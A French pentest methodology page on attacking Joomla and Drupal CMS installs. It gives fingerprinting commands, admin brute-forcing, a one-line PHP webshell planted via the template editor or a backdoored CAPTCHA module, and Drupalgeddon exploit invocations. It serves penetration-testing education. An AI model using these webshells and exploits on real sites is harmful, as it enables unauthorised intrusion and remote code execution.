# Attaquer Joomla et Drupal

Joomla et Drupal completent le trio des CMS open-source les plus repandus. Joomla represente environ 3,5% du marche des CMS avec 2,7 millions d'instances, Drupal environ 2,4% avec plus d'un million de sites. Ces deux CMS ecrits en PHP partagent un schema d'attaque similaire : identifier la version, tester les identifiants par defaut, puis exploiter soit une vulnerabilite connue, soit les fonctionnalites d'administration pour obtenir un RCE.

## Pourquoi

Joomla et Drupal sont couramment deployes par des organisations de toutes tailles (universites, gouvernements, entreprises). Ils sont regulierement oublies une fois installes, surtout en environnement interne. Un Joomla 3.x ou un Drupal 7 non mis a jour depuis plusieurs annees est un candidat ideal pour les vulnerabilites de type Drupalgeddon ou les abus de fonctionnalites natives.

## Comment ca marche

### Joomla

#### Identification

```bash
# - Confirmer Joomla via le meta generator
curl -s http://<IP_CIBLE>/ | grep Joomla

# - Version via le manifeste XML
curl -s http://<IP_CIBLE>/administrator/manifests/files/joomla.xml | grep version

# - Version via le README
curl -s http://<IP_CIBLE>/README.txt | head -n 5
```

Le `robots.txt` de Joomla contient des references a `/administrator/`, `/cache/`, `/cli/`, `/components/`, `/includes/`, etc. La page d'administration est accessible a `/administrator/index.php`.

#### Enumeration

```bash
# - Scan Joomla avec droopescan
droopescan scan joomla --url http://<IP_CIBLE>/

# - Scan avec JoomlaScan (Python2)
python2 joomlascan.py -u http://<IP_CIBLE>
```

{% hint style="info" %}
Contrairement a WordPress, Joomla ne permet pas l'enumeration d'utilisateurs via les messages d'erreur de la page de login. Le message est toujours generique : "Username and password do not match or you do not have an account yet."
{% endhint %}

#### Brute force

Le compte administrateur par defaut est `admin`, le mot de passe est defini a l'installation. On peut utiliser un script de brute force specifique :

```bash
# - Brute force Joomla
python3 joomla-brute.py -u http://<IP_CIBLE> \
    -w /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt -usr admin
```

#### RCE via l'editeur de templates

Avec un acces admin, on modifie un template pour y injecter du code PHP :

1. Naviguer vers `Extensions` > `Templates`
2. Choisir un template (ex: Protostar)
3. Editer `error.php`
4. Ajouter : `system($_GET['cmd']);`
5. Acceder au webshell via `/templates/protostar/error.php?cmd=id`

```bash
# - Verification
curl -s http://<IP_CIBLE>/templates/protostar/error.php?cmd=id
```

#### CVE-2019-10945 : directory traversal authentifie

Sur Joomla 1.5.0 a 3.9.4, une faille de traversee de repertoire permet de lire des fichiers arbitraires et de les supprimer via l'interface d'administration.

```bash
# - Lister le contenu de la racine web
python2.7 joomla_dir_trav.py \
    --url "http://<IP_CIBLE>/administrator/" \
    --username admin --password admin --dir /
```

### Drupal

#### Identification

```bash
# - Confirmer Drupal via le meta generator
curl -s http://<IP_CIBLE>/ | grep Drupal

# - Version via le CHANGELOG.txt (Drupal 7 et anterieur)
curl -s http://<IP_CIBLE>/CHANGELOG.txt | head -n 2

# - Scan avec droopescan
droopescan scan drupal -u http://<IP_CIBLE>
```

Drupal utilise un systeme de nodes (`/node/1`, `/node/2`...) pour organiser son contenu. C'est un indicateur fiable meme quand le theme est personnalise.

#### RCE via le module PHP Filter

**Drupal 7** : activer le module PHP Filter depuis `admin/modules`, puis creer une "Basic page" avec du code PHP et le format de texte "PHP code".

**Drupal 8+** : le module PHP Filter n'est plus installe par defaut. Il faut le telecharger et l'installer manuellement depuis l'interface d'administration.

```bash
# - Telecharger le module PHP Filter pour Drupal 8
wget https://ftp.drupal.org/files/projects/php-8.x-1.1.tar.gz
# Installer via Administration > Reports > Available updates
```

#### RCE via module backdoore

On peut creer un module Drupal contenant un webshell :

```bash
# - Telecharger un module existant (ex: CAPTCHA)
wget https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz
tar xvf captcha-8.x-1.2.tar.gz

# - Ajouter un webshell et un .htaccess dans le repertoire du module
# shell.php : <?php system($_GET['cmd']); ?>
# .htaccess : RewriteEngine On / RewriteBase /
mv shell.php .htaccess captcha/
tar cvf captcha.tar.gz captcha/

# - Installer via Administration > Extend > Install new module
# - Acceder au webshell
curl http://<IP_CIBLE>/modules/captcha/shell.php?cmd=id
```

#### Drupalgeddon (CVE-2014-3704)

Injection SQL pre-authentification sur Drupal 7.0 a 7.31. Permet de creer un compte admin ou d'injecter du code malveillant.

```bash
# - Creer un compte admin
python2.7 drupalgeddon.py -t http://<IP_CIBLE> -u hacker -p motdepasse
```

#### Drupalgeddon2 (CVE-2018-7600)

RCE pre-authentification sur Drupal < 7.58 et < 8.5.1. Exploite un defaut de validation des entrees lors de l'enregistrement utilisateur.

```bash
# - Upload d'un webshell
python3 drupalgeddon2.py
# Entrer l'URL cible, verifier le fichier uploade
curl http://<IP_CIBLE>/webshell.php?cmd=id
```

#### Drupalgeddon3 (CVE-2018-7602)

RCE authentifie qui necessite un utilisateur avec le droit de supprimer un node. Exploitable via Metasploit avec un cookie de session valide.

## En pratique

```bash
# Joomla
# 1 - Identifier et versionner
curl -s http://<IP_CIBLE>/administrator/manifests/files/joomla.xml | grep version
# 2 - Enumerer
droopescan scan joomla --url http://<IP_CIBLE>/
# 3 - Brute force admin
python3 joomla-brute.py -u http://<IP_CIBLE> -w passwords.txt -usr admin
# 4 - RCE via template ou CVE

# Drupal
# 1 - Identifier et versionner
curl -s http://<IP_CIBLE>/CHANGELOG.txt | head -n 2
droopescan scan drupal -u http://<IP_CIBLE>
# 2 - Tester Drupalgeddon / Drupalgeddon2
# 3 - Si acces admin : PHP Filter ou module backdoore
```

## Pieges et galeres

{% tabs %}
{% tab title="Joomla" %}
- **Pas d'enumeration d'utilisateurs** : contrairement a WordPress, la page de login ne distingue pas un nom valide d'un nom invalide. Le brute force doit cibler `admin` ou des noms trouves par OSINT
- **Plugins internes** : Joomla appelle ses extensions "components". Les composants `com_admin`, `com_ajax`, etc. sont natifs et ne representent pas une surface d'attaque supplementaire
- **Erreur post-login** : sur certaines versions, le panneau d'administration affiche une erreur PHP apres la connexion. Desactiver le plugin "Quick Icon - PHP Version Check" resout le probleme
{% endtab %}
{% tab title="Drupal" %}
- **CHANGELOG bloque** : les versions recentes de Drupal bloquent l'acces a `CHANGELOG.txt` et `README.txt`. droopescan reste le meilleur outil pour identifier la version
- **Module PHP Filter absent** : sur Drupal 8+, il faut l'installer manuellement. Si l'upload de modules est desactive, le backdooring via un module existant est l'alternative
- **Drupalgeddon1 vs 2 vs 3** : la version 1 cree un admin (SQL injection), la 2 donne un RCE sans auth, la 3 necessite une session. Tester dans l'ordre : 2 (meilleur cas), puis 1, puis 3
{% endtab %}
{% endtabs %}

## Retour terrain

Joomla et Drupal sont moins frequents que WordPress mais pas rares pour autant. On les trouve souvent en environnement interne sur des sites de documentation, des portails d'equipe ou des sites e-commerce departementaux.

Les identifiants `admin:admin` sur Joomla sont d'une frequence surprenante, surtout sur les instances de dev ou de test. Pour Drupal, les versions 7.x sont encore tres presentes en production et potentiellement vulnerables a Drupalgeddon2, qui est un RCE pre-authentification trivial a exploiter.

L'abus de fonctionnalites natives (editeur de templates Joomla, module PHP Filter Drupal) reste le vecteur le plus fiable quand on dispose d'identifiants admin.

## Memo express

| Technique | CMS | Outil / Commande | Prerequis |
|---|---|---|---|
| Fingerprint | Joomla | `curl` manifeste XML, `droopescan` | URL |
| Fingerprint | Drupal | `CHANGELOG.txt`, `droopescan` | URL |
| Brute force | Joomla | `joomla-brute.py` | URL |
| RCE admin | Joomla | Editeur template `error.php` | Acces admin |
| Dir traversal | Joomla | CVE-2019-10945 | Acces admin, Joomla <= 3.9.4 |
| RCE admin | Drupal | PHP Filter ou module backdoore | Acces admin |
| RCE unauth | Drupal | Drupalgeddon2 (CVE-2018-7600) | Drupal < 7.58 / < 8.5.1 |
| SQLi unauth | Drupal | Drupalgeddon (CVE-2014-3704) | Drupal 7.0 - 7.31 |

***
